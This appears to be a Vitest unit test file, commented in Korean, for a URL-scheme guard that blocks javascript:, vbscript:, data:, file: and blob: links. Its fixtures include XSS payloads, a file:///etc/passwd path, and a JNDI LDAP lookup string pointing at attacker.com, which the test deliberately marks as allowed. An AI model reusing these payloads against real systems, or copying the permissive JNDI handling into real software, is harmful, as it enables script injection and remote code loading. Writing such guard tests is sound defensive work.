/**
 * dangerous-scheme-guard 유닛 테스트
 *
 * 검증 대상: isDangerousUrlScheme(url)
 * - DANGEROUS 스키마 (javascript:, vbscript:, data:, file:, blob:) 탐지
 * - 안전 스키마(http/https/telnet/ftp/jndi/intent/...) 통과
 * - 프로토콜 없음(abc.com) → 위험 아님 (false)
 *
 * Layer Ownership: 01-unit (순수 함수 입출력)
 */
import { describe, it, expect } from 'vitest';
import { isDangerousUrlScheme } from '@withwiz/toolkit/core/security/dangerous-scheme';

describe('isDangerousUrlScheme', () => {
  describe('위험 스키마 → true', () => {
    it.each([
      ['javascript:alert(1)'],
      ['javascript:void(0)'],
      ['JavaScript:alert(1)'], // 대문자 혼용
      ['vbscript:MsgBox("xss")'],
      ['VBScript:foo'],
      ['data:text/html,<script>alert(1)</script>'],
      ['data:text/html;base64,PHNjcmlwdD4='],
      ['file:///etc/passwd'],
      ['file:///C:/Windows/System32'],
      ['blob:https://example.com/123'],
    ])('차단: %s', (url) => {
      expect(isDangerousUrlScheme(url)).toBe(true);
    });
  });

  describe('안전 스키마 → false', () => {
    it.each([
      ['https://abc.com'],
      ['http://abc.com'],
      ['ftp://host/path'],
      ['ftps://host/path'],
      ['telnet://host:23'],
      ['gopher://host:70/0/foo'],
      ['ssh://user@host'],
      // jndi:는 보안상 위험하지만 사용자 목적("다양한 URI 스키마 수용")에 따라 통과시킴
      // 단, 실제 NextResponse.redirect로 보내져도 브라우저가 jndi 핸들러가 없으므로 동작 불가
      ['jndi:ldap://attacker.com/exploit'],
      ['intent://path#Intent;package=com.example;end'],
      ['market://details?id=com.example.app'],
      ['kakaotalk://channel/123'],
      ['whatsapp://send?text=hello'],
      ['fb://profile/123'],
      ['spotify:track:6rqhFgbbKwnb9MLmUQDhG6'],
      ['tel:+82-10-1234-5678'],
      ['mailto:user@host.com'],
      ['sms:+1234?body=hello'],
    ])('통과: %s', (url) => {
      expect(isDangerousUrlScheme(url)).toBe(false);
    });
  });

  describe('프로토콜 없는 입력 → false (위험 아님)', () => {
    it.each([
      ['abc.com'],
      ['www.example.com/path'],
      ['localhost:3000'],
      [''],
      ['  '],
      ['some-arbitrary-text'],
    ])('통과: %s', (url) => {
      expect(isDangerousUrlScheme(url)).toBe(false);
    });
  });

  describe('엣지 케이스', () => {
    it('앞뒤 공백 trim 후 판정', () => {
      expect(isDangerousUrlScheme('   javascript:alert(1)   ')).toBe(true);
      expect(isDangerousUrlScheme('   https://abc.com   ')).toBe(false);
    });

    it('스킴 매칭은 정확히 콜론 앞까지만 (javascript-look-alike 도메인은 통과)', () => {
      // 'javascripthelp.com'은 도메인이지 스킴이 아님 → 프로토콜 없음으로 판정 → false
      expect(isDangerousUrlScheme('javascripthelp.com')).toBe(false);
    });

    it('하이픈/숫자 포함 스키마(blob-like) — 정확한 스킴 매칭만 차단', () => {
      // RFC 3986 scheme 문법: ALPHA *(ALPHA / DIGIT / "+" / "-" / ".")
      expect(isDangerousUrlScheme('blob:foo')).toBe(true);
      expect(isDangerousUrlScheme('blobs:foo')).toBe(false); // 다른 스킴
      expect(isDangerousUrlScheme('data:foo')).toBe(true);
      expect(isDangerousUrlScheme('database:foo')).toBe(false);
    });
  });
});
